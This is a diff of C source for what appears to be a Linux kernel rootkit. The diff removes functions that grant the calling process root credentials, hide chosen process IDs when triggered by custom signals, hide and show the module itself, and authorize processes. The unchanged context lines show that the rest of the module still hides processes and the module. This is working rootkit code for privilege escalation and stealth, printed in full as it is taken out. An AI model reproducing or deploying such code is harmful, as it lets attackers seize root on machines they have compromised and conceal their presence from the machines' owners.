@@ -295,42 +295,6 @@ void unhide_module(void)
     pr_dev_info("* Module was unhidden\n");
 }
 
-long sig_hide_module(const pid_t i32_pid, const int i32_sig)
-{
-    hide_module();
-
-    return 0;
-}
-
-long sig_show_module(const pid_t i32_pid, const int i32_sig)
-{
-    unhide_module();
-
-    return 0;
-}
-
-long give_root(const pid_t i32_pid, const int i32_sig)
-{
-    struct cred *p_creds = NULL; // Pointer to the current task credentials
-
-    // Get the current task credentials
-    p_creds = prepare_creds();
-
-    IF_U (p_creds == NULL) {
-        pr_dev_err("* Failed to get credentials\n");
-        return -EPERM;
-    }
-
-    __SET_UIDS(p_creds, ROOT_UID);
-    __SET_GIDS(p_creds, ROOT_GID);
-
-    commit_creds(p_creds);
-
-    pr_dev_info("* Process is now root\n");
-
-    return 0;
-}
-
 static task_t *get_task_struct_by_pid(const pid_t i32_pid)
 {
     task_t *p_task = NULL; // Task structure
@@ -497,52 +461,6 @@ bool is_pid_hidden(const pid_t i32_pid)
     return is_pid_or_parent_in_list(i32_pid, &hidden_pids_list);
 }
 
-long show_hide_process(const pid_t i32_pid, const int i32_sig)
-{
-    pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
-    pid_list_t *p_tmp        = NULL;                       // Temporary pointer for iteration
-    const pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to show
-
-    IF_U (i32_real_pid == -1) {
-        return -EPERM;
-    }
-
-    switch (i32_sig) {
-    case SIGHIDE:
-        pr_dev_info("* Hiding process %d\n", i32_real_pid);
-
-        p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
-        IF_U (p_hidden_pid == NULL) {
-            pr_dev_err("  * Failed to allocate memory for PID list entry\n");
-            return -EPERM;
-        }
-
-        // Add the given PID to the list (if it is 0, add the current PID)
-        p_hidden_pid->i32_pid = i32_real_pid;
-
-        list_add(&p_hidden_pid->list, &hidden_pids_list);
-        break;
-
-    case SIGSHOW:
-        pr_dev_info("* Unhiding process %d\n", i32_real_pid);
-
-        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
-        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
-            if (p_hidden_pid->i32_pid == i32_real_pid) {
-                list_del(&p_hidden_pid->list);
-                kfree(p_hidden_pid);
-            }
-        }
-        break;
-
-    default:
-        pr_dev_err("* show_hide_process(): Invalid signal: %d\n", i32_sig);
-        return -EINVAL;
-    }
-
-    return 0;
-}
-
 void show_all_processes(void)
 {
     pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
@@ -563,31 +481,6 @@ bool is_process_authorized(const pid_t i32_pid)
     pr_dev_info("* Checking if PID %d is authorized...\n", i32_pid);
 
     return is_pid_or_parent_in_list(i32_pid, &authorized_pids_list);
-}
-
-long authorize_process(const pid_t i32_pid, const int i32_sig)
-{
-    pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
-    const pid_t i32_real_pid     = get_effective_pid(i32_pid); // Effective PID to authorize
-
-    IF_U (i32_real_pid == -1) {
-        return -EPERM;
-    }
-
-    pr_dev_info("* Authorizing process %d\n", i32_real_pid);
-
-    p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
-    IF_U (p_authorized_pid == NULL) {
-        pr_dev_err("  * Failed to allocate memory for PID list entry\n");
-        return -EPERM;
-    }
-
-    // Add the given PID to the list (if it is 0, add the current PID)
-    p_authorized_pid->i32_pid = i32_real_pid;
-
-    list_add(&p_authorized_pid->list, &authorized_pids_list);
-
-    return 0;
 }
 
 void clear_auth_list(void)
